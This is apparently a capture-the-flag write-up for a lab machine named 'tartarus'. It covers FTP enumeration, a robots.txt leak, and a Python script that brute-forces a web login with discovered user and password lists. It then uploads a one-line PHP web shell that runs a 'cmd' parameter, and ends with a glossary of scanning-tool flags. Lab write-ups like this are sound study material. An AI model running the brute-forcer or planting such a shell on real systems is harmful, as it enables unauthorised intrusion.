November 01, 2020

FTP (21) - Part II

I again log myself through FTP and this time took a better look around, this time not ignoring entries starting with . when listing the files:

ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 .

-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt

If you are slightly comfortable with *nix environments, you know that . means current directory, .. means previous directory but ... isn’t really a thing. So, someone named a directory ... deliberately. Interesting. Let’s check what is inside: 

ftp> cd ...
200 PORT command successful. Consider using PASV.
ftp> ls -al
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 yougotgoodeyes.txt

150 Here comes the directory listing.

So there was indeed, a different file and the content was just /sUp3r-s3cr3t. Judging by the forward slash prefix, it stroke me as a potential web directory. I was right. Time to give the http server a go again.

Web (80) - Part II

Presented with a login page, I tried a few default username/password combinations just to make sure I wasn’t really missing anything. Gobuster was already running in background and found a directory called /images (I’ve ran the same Gobuster as the one above but adding the /sUp3r-s3cr3t at the end of the url), which I couldn’t access.

Also, while thinking about it, I previously assumed - n00b mistake - that since it was a default Apache setup, everything was also default so I didn’t bother checking. I went back and found /robots.txt was available, giving away a pretty important piece of information:

User-Agent: *
Disallow: /admin-dir

I told d4rckh we should hide our things deep

This led me to a open directory where I found two files: credentials.txt and userid. Both files contained what appeared to be a list of passwords and usernames.

After investing some time trying to sort it out Hydra’s terrible syntax that led me nowhere but frustration town, I decided to brute force my way in, scripting it myself. After manually poking with the login page to understand how it worked, I wrote this:

#!/usr/bin/python3

import requests;                                                                                    
                                                                                                    
url = "http://tartarus.thm/sUp3r-s3cr3t/authenticate.php"                                           
                                                                                                    
with open('userid', 'r') as f:                                                                      
    usernames = [username.strip() for username in f.readlines() if username]                        
                                                                                                    
with open('credentials.txt', 'r') as f:                                                             
    passwords = [password.strip() for password in f.readlines() if password]
                                                  
print('Brute forcing...')          
for user in usernames:             
    response = requests.post(url, {                                                                 
        "username": user,                                                                           
        "password": 'doesntmatter'                                                                  
    })                                                                                              
                                                                                                    
    if response.status_code == 200 and response.text == 'Incorrect password!':
        found_user = user                         
        print(f'username {user}')                 
        break                                     
                                                  
for passwd in passwords:           
    response = requests.post(url, {
        "username": found_user,
        "password": passwd
    })

    if response.status_code == 200 and response.text != 'Incorrect password!':
        print(f'password {passwd}')
        break

The script is quite self explanatory. I basically replicated the same step-by-step I had previously executed manually to then, move that into actual piece of program that can repeat the tedious process of going through the both lists and validate all the possibilities. There might be better ways of doing so but I think being able to craft your own “exploits” as you go is a fine art. I suggest you to exercise that as much as you can.

Combining that woth both credentials and userid wordlists, I managed to find the user and password necessary (enox:P@ssword1234) so I could log in, which presented me with a “Upload your file” kind of page.

Getting a shell + user flag

I immediately created a simple php file with this and send it over: 

<?php
system($_GET['cmd'])
?>

I could go for the pentest monkey php reverse shell but I usually try to make things as simple as I can. This gives me everything I need: system function executes whenever command I would passed in, while the $_GET['cmd'] is a request param I’ve sent (which I named cmd).

Command breakdown

Nmap

Nmap is free security scanner, port scanner & network exploration tool.

First usage:
  • -sC: This options lets you take advantage of the vast scripts that are part of the the nmap ecosystem. We will dive into that in a future tutorial.
  • -sV: This allows me to know the different version which port is currently running. The absence of this, for instance, would just display that ftp is running in the port 23 without telling you its vsftpd 3.0.3.
Second usage:
  • -Pn: Assumes that the host being scanned is up, skipping the verification.
  • -p-: Scan all 65535 ports.

Tee

Tee allows you to read something from the standard input and outputs it standard output.

  • -a: With the addition of this option, it allows you to append the output to a file - nmap-report in this case - which can be used for later reference.

Gobuster

Gobuster is a tool used to brute-force URIs, DNS and Virtual Hosts.

  • dir: Tells gobuster we are scanning directories.
  • -u: Current hosted being scanned.
  • -w: Wordlist path being used.
  • -t: Number of threads we are using.

cURL

a HTTP client.

  • -s: Silent mode or do not show progress while retrieving data.
  • -i: Show headers as part of the response.
